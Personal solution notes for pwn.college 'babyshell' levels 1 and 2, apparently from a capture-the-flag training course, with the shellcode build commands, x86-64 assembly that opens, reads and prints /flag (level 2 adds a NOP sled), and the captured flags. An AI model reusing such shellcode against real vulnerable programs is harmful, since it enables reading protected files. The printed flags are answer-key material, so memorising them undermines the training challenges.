# Useful commands
gcc -nostdlib -static -o shellcode-elf solve.s && objcopy --dump-section .text=shellcode-raw shellcode.elf
objdump -M intel -d solve.elf //view the shellcode
hd solve.bin
strace ./solve.elf

## Level1
```
.global _start
.intel_syntax noprefix
_start:
# open
	mov rsi, 0
	lea rdi, [rip+flag]
	mov rax, 2 
	syscall
# read
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 100
	mov rax, 0
	syscall
# write
	mov rdi, 1
	mov rsi, rsp
	mov rdx, rax 
	mov rax, 1
	syscall
# exit
	mov rax, 60
	mov rdi, 42
	syscall
flag:
	.ascii "/flag\0"
```
(cat shellcode-raw; cat) | /challenge/babyshell_level1
pwn.college{YfXbRWPKP0McCGEmGvvcSW_dj3x.01NxIDLwIzW}

## Level2
```
.global _start
.intel_syntax noprefix
nop
nop
nop
... (1000+ nops)
nop
nop
nop
_start:
# open
	mov rsi, 0
	lea rdi, [rip+flag]
	mov rax, 2 
	syscall
# read
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 100
	mov rax, 0
	syscall
# write
	mov rdi, 1
	mov rsi, rsp
	mov rdx, rax 
	mov rax, 1
	syscall
# exit
	mov rax, 60
	mov rdi, 42
	syscall
flag:
	.ascii "/flag\0"
```
pwn.college{QlLphMJ5SVm-DAQZRqLksfU7gLN.0FOxIDLwIzW}

## Level3

